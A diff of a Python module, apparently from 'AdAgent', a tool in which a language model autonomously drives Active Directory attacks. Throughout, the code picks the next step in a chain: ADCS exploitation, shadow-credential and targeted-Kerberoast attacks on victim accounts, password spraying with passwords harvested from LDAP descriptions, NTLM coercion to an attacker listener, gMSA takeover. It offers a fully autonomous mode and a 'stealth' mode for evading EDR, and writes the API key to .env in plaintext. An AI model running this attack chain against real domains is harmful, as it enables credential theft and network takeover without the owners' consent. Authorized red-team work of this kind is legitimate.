     # If ESC was found in loot but no TGT → request_tgt before adcs exploit
-    _esc_found = bool(intel["esc_vulns"]) or any("ESC" in str(f.get("name","")) for f in SESSION.get("findings",[]))
     _cc_valid  = _ccache_is_valid(cc)
     if _esc_found and not _cc_valid and not _done("request_tgt"):
         return "request_tgt", creds
 
-    if not _done("adcs_scan"):
-        return "adcs_scan", {**creds, "auto_exploit": True}
-
-    # Re-run adcs_scan after getting TGT (if ESC was found before TGT)
-    if _esc_found and _cc_valid and _calls("adcs_scan") < 2 and "adcs_scan" not in exclude:
+    if (not _done("adcs_scan") and krb
+            and _done("nmap_scan") and _done("enumerate_ldap")):
         return "adcs_scan", {**creds, "auto_exploit": True}
 
     # ACL/gMSA edges are often the shortest path from a standard domain user.
@@ -9984,9 +10237,14 @@ def _pick_next_tool(completed_tools: list,
         return "force_change_password_pivot", {**creds, "target_user": target}
 
     if usable_acl_paths:
+        # Prefer a concrete victim object the attacker has rights OVER — never the
+        # attacker's own account. Self-targeting shadow-creds/kerberoast is
+        # meaningless and fails with KDC_ERR_S_PRINCIPAL_UNKNOWN.
         right, target = next(
-            ((r, t) for r, t in usable_acl_paths if _valid_ad_target(t)),
-            usable_acl_paths[0],
+            ((r, t) for r, t in usable_acl_paths
+             if _valid_ad_target(t) and not _same_ad_account(t, u)),
+            next(((r, t) for r, t in usable_acl_paths if _valid_ad_target(t)),
+                 usable_acl_paths[0]),
         )
         right_l = str(right).lower()
         # gMSA path: GenericWrite/GenericAll/WriteDACL on $-account → takeover
@@ -10020,12 +10278,15 @@ def _pick_next_tool(completed_tools: list,
                     **creds, "target_user": script_candidates[0],
                 }
         if "genericwrite" in right_l or "genericall" in right_l or "writeowner" in right_l:
-            if not _done("shadow_credentials_attack") and target:
+            # Never self-target — the victim must be the object written OVER, not us.
+            if (not _done("shadow_credentials_attack") and target
+                    and not _same_ad_account(target, u)):
                 return "shadow_credentials_attack", {
                     "attacker_user": u, "attacker_pass": p,
                     "target_account": target, "dc_ip": dc, "domain": dom,
                 }
-        if not _done("targeted_kerberoast") and target and _real_user_target(target):
+        if (not _done("targeted_kerberoast") and target
+                and _real_user_target(target) and not _same_ad_account(target, u)):
             return "targeted_kerberoast", {**creds, "target_user": target}
 
     if intel["gmsa_hashes"] and not _done("evil_winrm"):
@@ -10084,28 +10345,33 @@ def _pick_next_tool(completed_tools: list,
     if not _done("kerbrute_enum"):
         return "kerbrute_enum", {"dc_ip": dc, "domain": dom}
 
-    # ── Priority 13: Password spray with discovered users ────────────────────
+    # ── Priority 12b: Test credentials found in LDAP Description fields ─────────
+    # Each desc_cred is a {user, password} pair for a specific account.
     _spray_userlist = "/tmp/users.txt"
+    desc_creds_pending = [
+        c for c in intel.get("valid_creds", [])
+        if c.get("auth") == "desc" and c.get("password") and c.get("user")
+        and _cred_marker(c) not in tested_cred_markers
+    ]
+    if desc_creds_pending and _calls("test_credential") < 3:
+        dc_c = desc_creds_pending[0]
+        return "test_credential", {
+            "dc_ip": dc, "domain": dom,
+            "username": dc_c["user"], "password": dc_c["password"],
+        }
+
+    # Also spray description passwords against all users (may reuse same pw on others)
+    desc_pws = [pw for pw in intel.get("desc_passwords", []) if pw and pw != p]
+    if desc_pws and _calls("password_spray") < 2 and Path(_spray_userlist).exists():
+        return "password_spray", {**creds, "passwords": desc_pws, "userlist": _spray_userlist}
+
+    # ── Priority 13: Password spray with discovered users ────────────────────
     if (p or h) and not _done("password_spray") and Path(_spray_userlist).exists():
         return "password_spray", {**creds, "userlist": _spray_userlist}
 
-    # ── Priority 13a: Trust chain planner — multi-domain after initial enum ──
-    if intel.get("trust_domains") and not _done("trust_chain_planner") and (p or h or krb):
-        return "trust_chain_planner", creds
+    # ── Priority 13a: Trust attacks — enumerate after initial enum ───────────
     if not _done("trust_attack") and (p or h or krb):
         return "trust_attack", {**creds, "attack": "enumerate"}
-
-    # ── Priority 13b-ext: ADFS — check for hybrid/cloud attack paths ──────────
-    if (intel.get("adfs_servers") or "adfs_found" in intel.get("local_privesc_hints", [])) \
-            and not _done("adfs_attack") and (p or h or krb):
-        adfs_srv = intel.get("adfs_servers", [dc])[0] if intel.get("adfs_servers") else ""
-        return "adfs_attack", {**creds, "adfs_server": adfs_srv, "action": "enumerate"}
-
-    # ── Priority 13b-ext2: WSUS — if discovered via ports or policy ───────────
-    if (intel.get("wsus_servers") or intel.get("wsus_servers_confirmed")) \
-            and not _done("wsus_attack") and (p or h or krb):
-        wsus = (intel.get("wsus_servers_confirmed") or intel.get("wsus_servers") or [""])[0]
-        return "wsus_attack", {**creds, "wsus_server": wsus}
 
     # ── Priority 13b: Advanced delegation / pre-auth attacks ─────────────────
     # Unconstrained delegation computers — valuable pivot to DA via TGT capture
@@ -10130,8 +10396,9 @@ def _pick_next_tool(completed_tools: list,
         return "pre2k_attack", {"dc_ip": dc, "domain": dom, "username": u, "password": p}
 
     # Coercion — last resort when attacker_ip is known and NTLM isn't blocked
-    if not ntlm_off and SESSION.get("attacker_ip") and not _done("coercion_attack"):
-        return "coercion_attack", {**creds, "attacker_ip": SESSION.get("attacker_ip", "")}
+    _listener_ip = _attacker_ip()
+    if not ntlm_off and _listener_ip and not _done("coercion_attack"):
+        return "coercion_attack", {**creds, "attacker_ip": _listener_ip}
 
     # ── User hunt — find lateral movement targets before giving up ───────────
     if not _done("user_hunt") and (p or h or krb):
@@ -10204,6 +10471,10 @@ def _agent_complete_override(completed_tools: list) -> tuple:
         "nt_hash": SESSION.get("nt_hash", ""),
     }
     intel = _agent_intel()
+    enum_attempted = any(name in completed_tools for name in (
+        "enumerate_ldap", "enumerate_shares", "collect_bloodhound",
+        "acl_abuse_scan", "adcs_scan",
+    ))
     for _right, target in _gmsa_write_edges():
         if "guard_gmsa_takeover" not in completed_tools and "gmsa_takeover" not in completed_tools:
             return "gmsa_takeover", {**creds, "target_gmsa": str(target)}, "guard_gmsa_takeover"
@@ -10220,6 +10491,15 @@ def _agent_complete_override(completed_tools: list) -> tuple:
             and "gmsa_read" not in completed_tools):
         return "gmsa_read", creds, "guard_gmsa_read"
 
+    cc = SESSION.get("krb5_ccache", "")
+    cc_valid = _ccache_is_valid(cc)
+    if (SESSION.get("password")
+            and enum_attempted
+            and (SESSION.get("ntlm_disabled") or intel.get("ntlm_disabled"))
+            and not cc_valid
+            and "guard_request_tgt" not in completed_tools):
+        return "request_tgt", creds, "guard_request_tgt"
+
     has_material_progress = bool(
         SESSION.get("loot")
         or SESSION.get("owned_users")
@@ -10234,11 +10514,6 @@ def _agent_complete_override(completed_tools: list) -> tuple:
     if _agent_has_progress():
         return "", {}, ""
 
-    cc = SESSION.get("krb5_ccache", "")
-    cc_valid = _ccache_is_valid(cc)
-
-    if SESSION.get("password") and not cc_valid and "guard_request_tgt" not in completed_tools:
-        return "request_tgt", creds, "guard_request_tgt"
     if cc_valid and "guard_enumerate_ldap_kerberos" not in completed_tools:
         SESSION["use_kerberos"] = True
         return "enumerate_ldap", creds, "guard_enumerate_ldap_kerberos"
@@ -10260,7 +10535,7 @@ def _make_fake_tc(name: str, inputs: dict, idx: int):
     tc.id = f"fallback_{idx}"
     tc.function = _F()
     tc.function.name = name
-    tc.function.arguments = json.dumps(inputs)
+    tc.function.arguments = json.dumps(_json_safe(inputs or {}), default=str)
     return tc
 
 
@@ -10269,7 +10544,7 @@ def _make_fake_tc(name: str, inputs: dict, idx: int):
 # obtained from another tool feeding back in). Everything else gets the loop guard.
 _REPEATABLE_TOOLS = {
     "evil_winrm", "lateral_movement",
-    "request_tgt", "adcs_scan",
+    "request_tgt",
 }
 
 def _stable_args_signature(name: str, inputs: dict) -> str:
@@ -10303,9 +10578,18 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
 
     password = _real_secret(password)
     nt_hash = _real_nt_hash(nt_hash)
+    if reset_session_for_target_change(dc_ip=target_ip, domain=domain):
+        warn("[Agent] Target/domain changed — cleared previous engagement state")
     _reset_agent_runtime_state()
     SESSION.update({"dc_ip": target_ip, "domain": domain,
                     "username": username, "password": password, "nt_hash": nt_hash})
+
+    # Wipe per-run agent_runtime FIRST — BEFORE validating Kerberos state below.
+    # Otherwise the validation confirms a ccache that this cleanup then deletes,
+    # leaving use_kerberos=True with KRB5CCNAME pointing at a removed file
+    # (GSSAPI "no credentials" / vanished ADCS ccache).
+    ts              = datetime.now().strftime('%Y%m%d_%H%M%S')
+    _clean_agent_output_for_new_run(ts)
 
     # ── Validate Kerberos state from previous runs ────────────────────────────
     # If SESSION has use_kerberos=True but the ccache file is missing/expired,
@@ -10327,9 +10611,6 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
             # ccache is valid — keep Kerberos mode active
             os.environ["KRB5CCNAME"] = _cc
             info(f"[Agent] Valid Kerberos ccache loaded: {_cc}")
-
-    ts              = datetime.now().strftime('%Y%m%d_%H%M%S')
-    _clean_agent_output_for_new_run(ts)
     _runtime_path("agent_loot").mkdir(exist_ok=True)
     _runtime_path("agent_loot_chain").mkdir(exist_ok=True)
     log_path        = LOG_DIR / f"agent_ollama_{ts}.json"
@@ -10343,9 +10624,6 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
     fail_counts:      dict = {}   # tool_name → consecutive failure count
     recent_call_sigs: list = []   # rolling window of (name, args) signatures
     tool_call_counts: dict = {}   # tool_name → total invocations (NOT deduped)
-    # ensure dead-path containers exist on SESSION so _pick_next_tool can read them
-    SESSION.setdefault("winrm_dead_for", [])
-    SESSION.setdefault("network_unreachable", False)
     info(f"Markdown report → {md_path}")
 
     dc_fqdn = _dc_host_for_kerberos(domain, target_ip)
@@ -10471,9 +10749,12 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
         if tool_calls and (_llm_picked_bad or _llm_ignoring_critical):
             tool_calls = [_make_fake_tc(_recommended, _rec_inputs, round_num)]
 
-        # ── Adaptive gate: force request_tgt when NTLM disabled + no ccache ────
+        # ── Adaptive gate: force request_tgt when proven NTLM-disabled + no ccache ─
+        # Do not pivot from nmap/banner hints alone. Normal AD order remains:
+        # nmap -> LDAP enum -> Kerberos repair only if auth evidence requires it.
         elif (tool_calls
               and _ntlm_off
+              and "enumerate_ldap" in completed_tools
               and not _cc_valid
               and "request_tgt" not in completed_tools
               and SESSION.get("password")
@@ -10760,12 +11041,16 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
                     "username": SESSION.get("username",""),
                 }, tgt_result, tgt_commands)
                 completed_tools.append("request_tgt")
-                # Re-allow every NTLM-failed enumerator to retry with Kerberos
+                # Re-allow NTLM-failed enumerators to retry with Kerberos.
+                # evil_winrm / lateral_movement are NOT reset here — they loop
+                # independently and should only retry when the credential changes.
+                # Do not blindly reset adcs_scan: if it already found/exploited
+                # ESC, removing it from completed_tools causes a duplicate
+                # certipy find/req after request_tgt.
                 for retryable in (
-                    "enumerate_ldap", "enumerate_shares", "adcs_scan",
+                    "enumerate_ldap", "enumerate_shares",
                     "asrep_roast", "kerberoast",
                     "collect_bloodhound", "auto_loot_chain", "acl_abuse_scan",
-                    "evil_winrm", "lateral_movement",
                 ):
                     while retryable in completed_tools:
                         completed_tools.remove(retryable)
@@ -10800,12 +11085,17 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
                 }, tgt_result, tgt_commands)
                 completed_tools.append("request_tgt")
                 for retryable in [
-                    "enumerate_ldap", "enumerate_shares", "adcs_scan",
+                    "enumerate_ldap", "enumerate_shares",
                     "asrep_roast", "kerberoast",
                     "collect_bloodhound", "auto_loot_chain",
                 ]:
                     if retryable in completed_tools:
                         completed_tools.remove(retryable)
+                # Retry ADCS only if ADCS itself was the tool that failed from
+                # clock skew. A skew observed in SMB/LDAP must not make a
+                # successful ADCS scan run twice.
+                if name == "adcs_scan" and "adcs_scan" in completed_tools:
+                    completed_tools.remove("adcs_scan")
 
             # Mark as completed whether it succeeded or failed (avoid re-running)
             if name not in completed_tools:
@@ -10847,7 +11137,7 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
                     _print_tool_result("request_tgt [AUTO]", tgt_result)
                     completed_tools.append("request_tgt")
                     # Clear the loop so agent can continue
-                    for stuck in ["enumerate_ldap", "adcs_scan", "enumerate_shares"]:
+                    for stuck in ["enumerate_ldap", "enumerate_shares"]:
                         if stuck in completed_tools:
                             completed_tools.remove(stuck)
                 else:
@@ -11044,19 +11334,13 @@ def _print_mission_summary(round_num: int, mission_status: str, log_path: Path,
         md_log.add_summary(round_num, mission_status, findings, owned_u, owned_m, loot)
         success(f"Markdown report → {md_log.path}")
 
-    # ── Mission summary — logo palette ───────────────────────────────────────
-    status_col = AGENT_GREEN if mission_status == "success" else AGENT_PINK
-    findings_col = AGENT_GREEN if findings else AGENT_TEXT
-    owned_col  = AGENT_GREEN if owned_u or owned_m else AGENT_TEXT
-    loot_col   = AGENT_GREEN if loot else AGENT_TEXT
-
     print(f"\n  {AGENT_PINK}{'═'*68}{RST}")
-    print(f"  {AGENT_BLUE}{BOLD}AGENT MISSION:{RST} {status_col}{BOLD}{mission_status.upper()}{RST}")
-    print(f"  {AGENT_BLUE}Rounds     {RST}: {AGENT_WHITE}{round_num}{RST}")
-    print(f"  {AGENT_BLUE}Findings   {RST}: {findings_col}{BOLD}{len(findings)}{RST}")
-    print(f"  {AGENT_BLUE}Owned users{RST}: {owned_col}{owned_u}{RST}")
-    print(f"  {AGENT_BLUE}Owned hosts{RST}: {owned_col}{owned_m}{RST}")
-    print(f"  {AGENT_BLUE}Hashes     {RST}: {loot_col}{list(loot.keys())}{RST}")
+    print(f"  {AGENT_BLUE}{BOLD}AGENT MISSION:{RST} {AGENT_PINK}{BOLD}{mission_status.upper()}{RST}")
+    print(f"  {AGENT_BLUE}Rounds     {RST}: {AGENT_TEXT}{round_num}{RST}")
+    print(f"  {AGENT_BLUE}Findings   {RST}: {AGENT_TEXT}{len(findings)}{RST}")
+    print(f"  {AGENT_BLUE}Owned users{RST}: {AGENT_TEXT}{owned_u}{RST}")
+    print(f"  {AGENT_BLUE}Owned hosts{RST}: {AGENT_TEXT}{owned_m}{RST}")
+    print(f"  {AGENT_BLUE}Hashes     {RST}: {AGENT_TEXT}{list(loot.keys())}{RST}")
     print(f"  {AGENT_BLUE}JSON Log   {RST}: {AGENT_TEXT}{log_path}{RST}")
     if md_log:
         print(f"  {AGENT_BLUE}MD Report  {RST}: {AGENT_TEXT}{md_log.path}{RST}")
@@ -11066,29 +11350,7 @@ def _print_mission_summary(round_num: int, mission_status: str, log_path: Path,
 
 def _pause_after_agent_summary():
     """Keep final agent results visible until the operator explicitly exits."""
-    import sys as _sys
-    msg = f"\n  {AGENT_PINK}[Enter]{RST} to return to main menu... "
-    _sys.stdout.write(msg)
-    _sys.stdout.flush()
-
-    # Always read from /dev/tty — the controlling terminal.
-    # After dozens of subprocess calls, sys.stdin may be in a broken state
-    # (EOF, pipe, or wrong fd). Opening /dev/tty fresh gives a guaranteed
-    # interactive line read regardless of what the agent did to stdin.
-    try:
-        tty = open("/dev/tty", "r")
-        old_stdin  = _sys.stdin
-        _sys.stdin = tty          # redirect so input() reads from terminal
-        try:
-            input()               # blocks until Enter
-        except Exception:
-            pass
-        finally:
-            _sys.stdin = old_stdin
-            tty.close()
-    except Exception:
-        # Last resort: just wait a moment so the summary stays visible
-        time.sleep(2)
+    pause("[Enter] to return to main menu")
 
 
 def run_agent(target_ip: str, domain: str, username: str,
@@ -11104,6 +11366,8 @@ def run_agent(target_ip: str, domain: str, username: str,
     # Initialize session
     password = _real_secret(password)
     nt_hash = _real_nt_hash(nt_hash)
+    if reset_session_for_target_change(dc_ip=target_ip, domain=domain):
+        warn("[Agent] Target/domain changed — cleared previous engagement state")
     _reset_agent_runtime_state()
     SESSION.update({
         "dc_ip":    target_ip,
@@ -11112,6 +11376,11 @@ def run_agent(target_ip: str, domain: str, username: str,
         "password": password,
         "nt_hash":  nt_hash,
     })
+
+    # Wipe per-run agent_runtime FIRST — before validating Kerberos state below,
+    # so validation cannot confirm a ccache that cleanup then deletes.
+    ts       = datetime.now().strftime('%Y%m%d_%H%M%S')
+    _clean_agent_output_for_new_run(ts)
 
     # Validate Kerberos state (same check as Ollama loop)
     _cc = SESSION.get("krb5_ccache", "")
@@ -11143,8 +11412,6 @@ def run_agent(target_ip: str, domain: str, username: str,
     )
 
     messages = [{"role": "user", "content": init_msg}]
-    ts       = datetime.now().strftime('%Y%m%d_%H%M%S')
-    _clean_agent_output_for_new_run(ts)
     _runtime_path("agent_loot").mkdir(exist_ok=True)
     _runtime_path("agent_loot_chain").mkdir(exist_ok=True)
     log_path = LOG_DIR / f"agent_{ts}.json"
@@ -11345,12 +11612,9 @@ def run_agent(target_ip: str, domain: str, username: str,
                     "nt_hash": SESSION.get("nt_hash",""),
                 }, tgt_result, tgt_commands)
                 completed_tools.append("request_tgt")
-                for retryable in [
-                    "enumerate_ldap", "enumerate_shares", "adcs_scan",
-                    "asrep_roast", "kerberoast",
-                    "collect_bloodhound", "auto_loot_chain",
-                ]:
-                    if retryable in completed_tools:
+                skew_retryable = ["adcs_scan", "asrep_roast", "kerberoast", "collect_bloodhound"]
+                for retryable in skew_retryable:
+                    if retryable in completed_tools and fail_counts.get(retryable, 0) > 0:
                         completed_tools.remove(retryable)
 
             # Analyze result and build intel brief
@@ -11470,62 +11734,90 @@ def run_agent(target_ip: str, domain: str, username: str,
 #  INTERACTIVE MODULE ENTRY POINT
 # ══════════════════════════════════════════════════════════════════════════════
 
+def _print_mcp_setup():
+    """Explain the MCP path: AdAgent runs as a tool server inside Claude Code /
+    Cursor, which is the brain and funds the LLM from its own subscription — so
+    there is NO API key and NO local model on this path. This is a different
+    entry point from the standalone agent above; it is launched by the host, not
+    from this menu (a stdio server needs a client on the other end)."""
+    repo = Path(__file__).resolve().parents[2]
+    vpy  = repo / "venv" / "bin" / "python3"
+    py   = str(vpy) if vpy.exists() else "python3"
+    srv  = repo / "mcp_server.py"
+    print(f"""
+  {fg(75)}{BOLD}MCP server — no API key, no local model{RST}
+
+  On this path AdAgent does NOT run its own brain. You register it as a tool
+  server in {fg(110)}Claude Code / Cursor / Claude Desktop{RST}, and the host LLM (your
+  existing subscription) decides which tool to call. No menu, no key prompt.
+
+  {fg(71)}1.{RST} Register it (one time):
+     {fg(110)}claude mcp add adagent -- {py} {srv}{RST}
+
+     …or add to {fg(110)}.mcp.json{RST}:
+     {{
+       "mcpServers": {{
+         "adagent": {{
+           "command": "{py}",
+           "args": ["{srv}"]
+         }}
+       }}
+     }}
+
+  {fg(71)}2.{RST} In Claude Code, set the engagement once, then let it drive:
+     {DIM}set_engagement: dc_ip, domain, username, password (or nt_hash){RST}
+
+  Full guide: {fg(110)}docs/mcp.md{RST}
+""")
+
+
 def run():
-    # ── Palette shortcuts ─────────────────────────────────────────────────────
-    C  = AGENT_BLUE   # cyan  — labels
-    V  = AGENT_PINK   # violet — secondary
-    G  = AGENT_GREEN  # green — success/recommended
-    W  = AGENT_WHITE  # white — values
-    GR = AGENT_TEXT   # gray  — secondary text
-    YL = AGENT_WARN   # yellow — warning
+    print_banner(
+        "RED TEAM AGENT — AI-Powered AD Attack",
+        "Ollama (local/free) or Claude API — autonomous AD attack orchestrator"
+    )
 
     from utils.helpers import input_or_session as _ios, prompt as _prompt
 
-    # ── Header ───────────────────────────────────────────────────────────────
-    sys.stdout.write("\033[2J\033[H")
-    sys.stdout.flush()
-    W_cols = shutil.get_terminal_size((90, 24)).columns
-    bar  = f"  {V}{'─' * min(72, W_cols - 4)}{RST}"
-    print()
-    print(bar)
-    print(f"  {C}{BOLD}  ADAGENT{RST}  {GR}v1.0  ·  AI-Powered Active Directory Attack Agent{RST}")
-    print(f"  {GR}  59 tools · 139 techniques · Ollama + Claude · by tmrswrr{RST}")
-    print(bar)
-    print()
-
     # ── Backend selection ─────────────────────────────────────────────────────
-    print(f"  {C}{BOLD}AI Backend{RST}")
-    print(f"  {GR}{'─' * 40}{RST}")
-    print(f"  {C}[1]{RST}  Ollama   {G}← recommended{RST}  {GR}local · free · no internet{RST}")
-    print(f"  {C}[2]{RST}  Claude   {GR}Anthropic API key required{RST}")
-    print(f"  {GR}[0]{RST}  Back")
-    print()
-    backend = input(f"  {GR}Backend [1]:{RST} ").strip() or "1"
+    print(f"""
+  {fg(75)}{BOLD}Backend (AI Engine):{RST}
+  {fg(71)}[1]{RST} Ollama  {fg(71)}← RECOMMENDED{RST}  (local, free, no internet required)
+  {fg(110)}[2]{RST} Claude  (Anthropic API key required)
+  {fg(71)}[3]{RST} MCP server  (run inside Claude Code / Cursor — {fg(71)}no API key{RST})
+  {fg(238)}[0]{RST} Back
+""")
+    backend = input(f"  Backend [1]: ").strip() or "1"
     if backend == "0":
+        return
+    if backend == "3":
+        _print_mcp_setup()
+        pause()
         return
 
     use_ollama = (backend != "2")
 
     # ── Target information ────────────────────────────────────────────────────
-    print()
-    print(f"  {C}{BOLD}Target{RST}")
-    print(f"  {GR}{'─' * 40}{RST}")
     dc_ip    = _ios("dc_ip",    "DC IP Address")
     domain   = _ios("domain",   "Domain")
     username = _ios("username", "Username")
     password = _ios("password", "Password", secret=True)
     nt_hash  = SESSION.get("nt_hash", "")
 
+    # Persist any newly-entered credentials so they are not asked again next run
+    from config.settings import save_session as _save_session
+    _save_session()
+
     if not all([dc_ip, domain]):
-        error("DC IP and Domain are required.")
+        error("DC IP and Domain are required. Username is optional (null session mode).")
         pause()
         return
+    # Allow no-credential mode: null session → anonymous LDAP → RID cycling → AS-REP roast
     if not username:
-        print(f"\n  {YL}[!]{RST} {W}No username — starting in NULL SESSION mode{RST}")
-        print(f"  {GR}    LDAP anon → RID cycle → AS-REP roast{RST}")
+        warn("No username provided — starting in NULL SESSION mode")
+        warn("Agent will: enumerate LDAP anonymously → RID cycle → AS-REP roast no-preauth accounts")
 
     # ── Model selection ───────────────────────────────────────────────────────
-    print()
     if use_ollama:
         try:
             raw = subprocess.run(["ollama", "list"], capture_output=True, text=True).stdout
@@ -11533,27 +11825,27 @@ def run():
         except Exception:
             installed = []
 
-        print(f"  {C}{BOLD}Ollama Models{RST}")
-        print(f"  {GR}{'─' * 40}{RST}")
+        print(f"\n  {fg(75)}{BOLD}Installed Ollama Models:{RST}")
         model_map = {}
         for i, m in enumerate(installed, 1):
-            is_tool = any(k in m for k in ["mistral","qwen","llama3","deepseek","command"])
-            tag = f"  {G}← tool calling{RST}" if is_tool else f"  {GR}(basic){RST}"
-            print(f"  {C}[{i}]{RST}  {W}{m}{RST}{tag}")
+            tag = f"{fg(71)}← tool calling{RST}" if any(
+                k in m for k in ["mistral","qwen","llama3","deepseek"]) else ""
+            print(f"  {fg(110)}[{i}]{RST} {m}  {tag}")
             model_map[str(i)] = m
 
         if not installed:
-            print(f"  {YL}[!]{RST} No Ollama models found.")
-            print(f"  {GR}    ollama pull qwen2.5-coder:7b{RST}")
-            print(f"  {GR}    ollama pull mistral{RST}")
+            warn("No models found — install one first:")
+            print(f"  {DIM}  ollama pull mistral{RST}")
+            print(f"  {DIM}  ollama pull qwen2.5-coder:7b{RST}")
             pause()
             return
 
-        print(f"\n  {GR}Recommended: qwen2.5-coder:7b  or  mistral{RST}")
-        choice = input(f"\n  {GR}Model [1]:{RST} ").strip() or "1"
+        print(f"\n  {DIM}Recommended: mistral or qwen2.5-coder:7b{RST}")
+        choice = input(f"  Model [1]: ").strip() or "1"
         ollama_model = model_map.get(choice, installed[0])
 
     else:
+        # Claude API
         api_key = os.environ.get("ANTHROPIC_API_KEY", "")
         if not api_key:
             api_key = _prompt("Anthropic API Key")
@@ -11562,54 +11854,53 @@ def run():
                 pause()
                 return
             os.environ["ANTHROPIC_API_KEY"] = api_key
+            # Save to .env so it is not asked again on next run
+            env_file = Path(__file__).resolve().parents[2] / ".env"
+            try:
+                existing = env_file.read_text() if env_file.exists() else ""
+                if "ANTHROPIC_API_KEY" not in existing:
+                    with open(env_file, "a") as _ef:
+                        _ef.write(f"\nANTHROPIC_API_KEY={api_key}\n")
+            except Exception:
+                pass
 
-        print(f"  {C}{BOLD}Claude Model{RST}")
-        print(f"  {GR}{'─' * 40}{RST}")
-        print(f"  {C}[1]{RST}  claude-opus-4-7          {GR}best reasoning · slower{RST}")
-        print(f"  {C}[2]{RST}  claude-sonnet-4-6        {G}← recommended{RST}  {GR}balanced{RST}")
-        print(f"  {C}[3]{RST}  claude-haiku-4-5         {GR}fast{RST}")
-        print()
-        mc = input(f"  {GR}Model [2]:{RST} ").strip() or "2"
+        print(f"""
+  {fg(110)}Claude Model:{RST}
+  [1] claude-opus-4-1-20250805  (best reasoning, slower)
+  [2] claude-sonnet-4-20250514  (balanced, recommended)
+  [3] claude-3-5-haiku-20241022 (fast)
+""")
+        mc = input(f"  Model [2]: ").strip() or "2"
         global MODEL
-        MODEL = {
-            "1": "claude-opus-4-7-20250514",
-            "2": "claude-sonnet-4-6",
-            "3": "claude-haiku-4-5-20251001",
-        }.get(mc, "claude-sonnet-4-6")
+        MODEL = {"1":"claude-opus-4-1-20250805","2":"claude-sonnet-4-20250514",
+                 "3":"claude-3-5-haiku-20241022"}.get(mc, "claude-sonnet-4-20250514")
 
     # ── Mode selection ────────────────────────────────────────────────────────
-    print()
-    print(f"  {C}{BOLD}Run Mode{RST}")
-    print(f"  {GR}{'─' * 40}{RST}")
-    print(f"  {C}[1]{RST}  Full Auto   {G}← default{RST}  {GR}agent runs fully autonomously{RST}")
-    print(f"  {C}[2]{RST}  Plan Only   {GR}generates attack plan, no execution{RST}")
-    print()
-    mode = input(f"  {GR}Mode [1]:{RST} ").strip() or "1"
+    print(f"""
+  {fg(75)}{BOLD}Mode:{RST}
+  {fg(71)}[1]{RST} Full Auto   — Agent runs fully autonomously
+  {fg(110)}[2]{RST} Plan Only   — Generates attack plan only (no execution)
+""")
+    mode = input(f"  Mode [1]: ").strip() or "1"
 
-    # ── OPSEC mode ────────────────────────────────────────────────────────────
-    print()
-    print(f"  {C}{BOLD}OPSEC Mode{RST}")
-    print(f"  {GR}{'─' * 40}{RST}")
-    print(f"  {C}[1]{RST}  Loud    {GR}fast · no jitter · all tools  (labs / CTF){RST}")
-    print(f"  {C}[2]{RST}  Normal  {G}← default{RST}  {GR}moderate OPSEC · jitter  (internal pentest){RST}")
-    print(f"  {C}[3]{RST}  Stealth {GR}max OPSEC · native-first  (red team / EDR){RST}")
-    print()
-    opsec_choice = input(f"  {GR}OPSEC [2]:{RST} ").strip() or "2"
+    # ── OPSEC mode ───────────────────────────────────────────────────────────
+    print(f"""
+  {fg(75)}{BOLD}OPSEC Mode:{RST}
+  {fg(71)}[1]{RST} Loud   — Fast, no jitter, all tools  {fg(238)}(labs / CTF){RST}
+  {fg(110)}[2]{RST} Normal — Moderate OPSEC, jitter     {fg(110)}(internal pentest){RST}  {fg(71)}← default{RST}
+  {fg(167)}[3]{RST} Stealth— Max OPSEC, native-first     {fg(167)}(real red team / EDR environments){RST}
+""")
+    opsec_choice = input(f"  OPSEC [2]: ").strip() or "2"
     global OPSEC_MODE
     OPSEC_MODE = {"1": "loud", "2": "normal", "3": "stealth"}.get(opsec_choice, "normal")
     os.environ["ADSTRIKE_OPSEC"] = OPSEC_MODE
 
-    # ── Launch summary ────────────────────────────────────────────────────────
     print()
-    print(bar)
-    backend_str = f"Ollama / {ollama_model}" if use_ollama else f"Claude / {MODEL}"
-    print(f"  {C}{BOLD}  STARTING AGENT{RST}")
-    print(f"  {GR}  Target    {RST}{W}{username or 'anonymous'}@{domain}  ▶  {dc_ip}{RST}")
-    print(f"  {GR}  Backend   {RST}{W}{backend_str}{RST}")
-    print(f"  {GR}  OPSEC     {RST}{W}{OPSEC_MODE.upper()}{RST}  {GR}|  Max rounds: {MAX_ROUNDS}{RST}")
-    print(f"  {YL}  [!] Authorised penetration testing and red-team engagements only{RST}")
-    print(bar)
-    print()
+    backend_str = f"Ollama/{ollama_model}" if use_ollama else f"Claude/{MODEL}"
+    info(f"Starting AdAgent  {fg(71)}{domain or '(null session)'}{RST}/{fg(71)}{dc_ip}{RST}")
+    info(f"Backend: {fg(110)}{backend_str}{RST}  |  OPSEC: {fg(71)}{OPSEC_MODE.upper()}{RST}  |  Credentials: {username or 'NONE (null session)'}@{domain}")
+    info(f"Max rounds: {MAX_ROUNDS}  |  Log: {LOG_DIR}")
+    print(f"\n  {fg(167)}{BOLD}[!] AUTHORIZED PENETRATION TESTING & RED TEAM ONLY{RST}\n")
 
     # ── Plan only mode ───────────────────────────────────────────────────────
     if mode == "2":
@@ -11652,3 +11943,5 @@ def run():
         run_agent_ollama(dc_ip, domain, username, password, nt_hash, ollama_model)
     else:
         run_agent(dc_ip, domain, username, password, nt_hash, api_key)
+
+    pause("  [Enter] to return to main menu")
